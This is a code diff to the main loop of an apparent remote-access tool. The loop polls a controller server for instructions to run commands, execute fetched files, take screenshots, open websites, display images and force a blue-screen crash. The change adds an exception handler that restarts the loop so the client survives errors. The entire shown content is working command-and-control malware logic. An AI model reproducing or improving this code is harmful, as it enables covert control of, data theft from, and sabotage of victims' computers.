@@ -14,26 +14,33 @@ SCHEME = "http"
 
 
 def main() -> None:
-    while True:
-        get_commands_response = get(f"{SCHEME}://{IP}:{PORT}/command-center")
-        get_images_response = get(f"{SCHEME}://{IP}:{PORT}/image-center")
-        get_bsod_response = get(f"{SCHEME}://{IP}:{PORT}/bsod-center")
-        get_run_file_response = get(f"{SCHEME}://{IP}:{PORT}/runfile-center")
-        get_screenshot_file_response = get(f"{SCHEME}://{IP}:{PORT}/screenshot-center")
-        get_website_response = get(f"{SCHEME}://{IP}:{PORT}/website-center")
-        if get_commands_response.status_code == 200:
-            run_command(get_commands_response)
-        if get_images_response.status_code == 200:
-            load_image(get_images_response)
-        if get_bsod_response.status_code == 200:
-            invoke_bsod()
-        if get_run_file_response.status_code == 200:
-            run_file(get_run_file_response.json())
-        if get_screenshot_file_response.status_code == 200:
-            take_screenshot()
-        if get_website_response.status_code == 200:
-            open_website(get_website_response.text)
+    try:
+        while True:
+            get_commands_response = get(f"{SCHEME}://{IP}:{PORT}/command-center")
+            get_images_response = get(f"{SCHEME}://{IP}:{PORT}/image-center")
+            get_bsod_response = get(f"{SCHEME}://{IP}:{PORT}/bsod-center")
+            get_run_file_response = get(f"{SCHEME}://{IP}:{PORT}/runfile-center")
+            get_screenshot_file_response = get(
+                f"{SCHEME}://{IP}:{PORT}/screenshot-center"
+            )
+            get_website_response = get(f"{SCHEME}://{IP}:{PORT}/website-center")
+            if get_commands_response.status_code == 200:
+                run_command(get_commands_response)
+            if get_images_response.status_code == 200:
+                load_image(get_images_response)
+            if get_bsod_response.status_code == 200:
+                invoke_bsod()
+            if get_run_file_response.status_code == 200:
+                run_file(get_run_file_response.json())
+            if get_screenshot_file_response.status_code == 200:
+                take_screenshot()
+            if get_website_response.status_code == 200:
+                open_website(get_website_response.text)
+            sleep(DELAY)
+    except Exception as error:
+        print(error)
         sleep(DELAY)
+        main()
 
 
 def open_website(url: str) -> None:
